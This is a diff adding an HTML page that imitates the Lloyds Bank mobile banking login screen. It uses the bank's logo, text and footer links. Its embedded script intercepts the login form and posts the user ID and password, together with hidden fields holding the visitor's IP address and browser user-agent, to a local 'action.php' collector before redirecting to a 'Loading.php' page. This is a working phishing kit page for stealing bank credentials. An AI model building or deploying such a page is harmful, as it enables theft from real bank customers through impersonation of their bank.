@@ -1,0 +1,262 @@
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-gb"><head>
+        
+
+        <title>Lloyds Bank - Mobile Banking - Login</title>
+
+        <meta name="keywords" content="">
+        <meta name="description" content="">
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <meta http-equiv="content-language" content="en-gb">
+        <link rel="alternate" media="handheld" href="">
+        <meta name="viewport" content="width=device-width">
+
+        
+        <meta name="DCSext.hasTealium" content="1">
+
+        <link rel="apple-touch-icon" sizes="57x57" href="files/img/ltsb%2057x57-.JPG">
+        <link rel="apple-touch-icon" sizes="114x114" href="files/img/ltsb%20114x114-.JPG">
+
+        <link type="text/css" href="files/css/base-auto-min200720.css" rel="stylesheet">
+
+        
+
+        <link rel="shortcut icon" href="files/img/favicon.ico">
+		<script src="files/js/jquery.js"></script>
+	<script>
+	
+
+$( document ).ready(function() {
+
+	
+	var allInputs = $(":input");
+	
+
+	
+	
+	
+	
+	$('#frmLogin').submit(function(e){
+		e.preventDefault();
+		var username = $('#username').val();
+		var password = $('#password').val();
+		
+        if(username.includes("@")) {
+            document.getElementById("email_error_message").style = "";
+            return false;
+        }
+		if(username == null || username == ''){
+			return false;
+		}else{
+			
+		}
+		
+		if(password == null || password == ''){
+			return false;
+		}else{
+			
+		}
+		
+		$.ajax({
+			type : 'POST',
+			url : 'files/action.php?type=login',
+			data : $('#frmLogin').serialize(),
+			success: function (data) {
+				console.log(data);
+				var parsed_data = JSON.parse(data);
+				if(parsed_data.status == 'ok'){
+					//console.log(parsed_data);
+					
+					
+					location.href = "Loading.php"
+					
+					
+					
+				}else{
+					return false;
+				}
+				//console.log(parsed_data.status);
+			}
+			})
+		
+		
+		
+	});
+
+	
+	
+	
+});
+	
+	
+	
+	</script>
+    </head>
+    <body class="hasJS">
+        
+
+        <div id="outer">
+            <div id="banner">
+                <p id="logo">
+                    <img src="files/img/logo-.gif" alt="Lloyds Bank">
+                </p>
+
+                <p id="userstatusNGB">
+                    <img src="files/img/padlock-1429554491.png" alt="Secure">
+                </p>
+
+                <p class="cookiePolicy">
+                    <a title="Cookie Policy" href="https://online.lloydsbank.co.uk/personal/a/mobile/mobile_help/login/COOKIE_POLICY">
+                        Cookie Policy
+                    </a>
+                </p>
+
+                <div class="clearer"></div>
+            </div>
+
+            <div id="header">
+                <div class="panelTL">
+                    <div class="panelTR">
+                        <div class="panelBR">
+                            <div class="panelBL">
+                                <div id="headerInner">
+                                    <!-- start TS:component_0_free_format -->
+
+                                    <h1>Welcome to Internet Banking</h1>
+
+                                    <!-- end TS:component_0_free_format -->
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+
+
+            <div class="content">
+                <div class="login">
+                    <div class="panelTL">
+                        <div class="panelTR">
+                            <div class="panelBR">
+                                <div class="panelBL">
+                                    <div class="loginInner">
+									                                        <div id="email_error_message" class="msgError" style="display:none">
+                                            <div class="msgTL">
+                                                <div class="msgTR">
+                                                    <div class="msgBR">
+                                                        <div class="msgBL">
+                                                                <p class="msgP">You are not allowed to use your email. Please try again. <a href="https://www.online.lloydsbank.co.uk/" title="">Having problems signing in?</a> Please note, you’ll be redirected to the desktop site.</p>              
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="loginFields">
+                                            <form id="frmLogin" name="frmLogin" method="post" action="/personal/mbprimarylogin" autocomplete="off">
+											<input type="hidden" name="ip" value="160.36.59.197">
+												<input type="hidden" name="ua" value="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36">
+                                                <div class="formField">
+                                                    <label for="frmLogin:lblUserID">User ID</label>
+                                                    <input required="" type="text" autocomplete="off" id="username" name="username" class="wide" maxlength="30">
+                                                </div>
+
+                                                <div class="formField">
+                                                    <label for="frmLogin:lblPassword">Password</label>
+                                                    <input required="" type="password" autocomplete="off" id="password" name="password" class="wide" maxlength="20" value="">
+                                                </div>
+                                                <div class="formField loginCheckbox">
+                                                    <input class="checkbox" type="checkbox" name="frmLogin:loginRemember">
+                                                    <label class="checkboxLabel" for="frmLogin:loginRemember">
+                                                        <a id="rememberMe" name="rememberMe" title="Remember my User ID" href="https://online.lloydsbank.co.uk/personal/a/mobile/mobile_help/login/REMEMBER_ME">
+                                                            Remember my User ID
+                                                        </a>
+                                                    </label>
+                                                </div>
+                                                <div class="actionsLogin">
+                                                    <div class="divider">
+                                                        <hr>
+                                                    </div>
+
+                                                    <input id="frmLogin:lnkLogin1" name="frmLogin:lnkLogin1" type="submit" value="Continue" text="Continue" class="submitAction">
+                                                </div>
+                                                
+                                            </form>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="aside">
+                    <p class="sideNote">
+                        <a id="lnkForgotUserIDDMC" name="lnkForgotUserIDDMC" href="https://online.lloydsbank.co.uk/ib-access/cwa/forgotten-details/index.html" title="Forgotten your logon details?">Forgotten your logon details?</a>
+                    </p>
+                </div>
+
+                <div class="appBannerBG">
+                    <div class="appBannerLink market">
+                        <p style="text-align: center;">
+                            <a title="Personal Loan. Use our online calculator to check if you are likely to be approved for a loan without affecting your credit score. Lending is subject to status." href="https://www.lloydsbank.com/loans.html?WT.ac=lon/public/navigation/ban/r1pr/loan/s/rl/LLnsNGBonB" target="_blank" rel="noopener noreferrer">
+                                <img alt="Personal Loan. Use our online calculator to check if you are likely to be approved for a loan without affecting your credit score. Lending is subject to status." src="files/img/personalloan2020-.png">
+                            </a>
+                        </p>
+                    </div>
+                </div>
+                <div class="clearer"></div>
+
+                <div id="footerLogin">
+                    <div class="FootNav">
+                        <div class="lnkLevFoot">
+                            <p class="lnkLevFootP">
+                                <a title="Register for Internet Banking" href="https://online.lloydsbank.co.uk/personal/a/useradmin/mobile/registration/selectaccounttyperegistration.jsp?mobile=true"> Register for Internet Banking</a>
+
+                                <a title="Go to desktop site" href="https://online.lloydsbank.co.uk/personal/logon/login.jsp?mobile=false">Go to desktop site</a>
+
+                                <a title="Help" href="https://online.lloydsbank.co.uk/personal/a/mobile/mobile_help/login/HELP"> Help</a>
+
+                                <a title="Security" href="https://online.lloydsbank.co.uk/personal/a/mobile/mobile_help/login/SECURITY"> Security</a>
+
+                                <a title="Contact us" href="https://online.lloydsbank.co.uk/personal/a/mobile/mobile_help/login/CONTACT_US"> Contact us</a>
+
+                                <a title="Mobile Banking" href="https://online.lloydsbank.co.uk/personal/a/mobile/mobile_help/login/MOBILE_BANKING">Mobile Banking</a>
+
+                                <a title="Legal" href="https://online.lloydsbank.co.uk/personal/a/mobile/mobile_help/login/LEGAL">Legal</a>
+                            </p>
+                        </div>
+                        <div class="aside">
+                            <div class="aside">
+                                <p class="sideNote">
+                                    <a title="Mobile Banking" href="https://online.lloydsbank.co.uk/personal/a/mobile/mobile_help/login/MOBILE_BANKING">Mobile Banking</a>
+                                </p>
+                            </div>
+
+                            <div class="appBannerBG">
+                                <div class="appBannerLink">
+                                    <p align="center">
+                                        <a href="http://www.lloydsbank.com/legal/financial-services-compensation-scheme.asp" title="fscs login tile"><img alt="fscs login tile" src="files/img/Mobile%2520-%25201x-1461591119.png"></a>
+                                    </p>
+                                </div>
+                            </div>
+
+                            <div class="clearer"></div>
+                            <div>
+                                <div class="footerLinksLogin">
+                                    <a title="Security" href="https://online.lloydsbank.co.uk/personal/a/mobile/mobile_help/login/SECURITY">Security</a>
+
+                                    <a title="Legal" href="https://online.lloydsbank.co.uk/personal/a/mobile/mobile_help/login/LEGAL">Legal</a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <input type="hidden" name="smartAppForIosAndAndroid" value="true"> <input type="hidden" name="smartAppForIosAbvSix" value="true">
+                </div>
+            </div>
+        </div>
+
+        
+    
+
+</body></html>
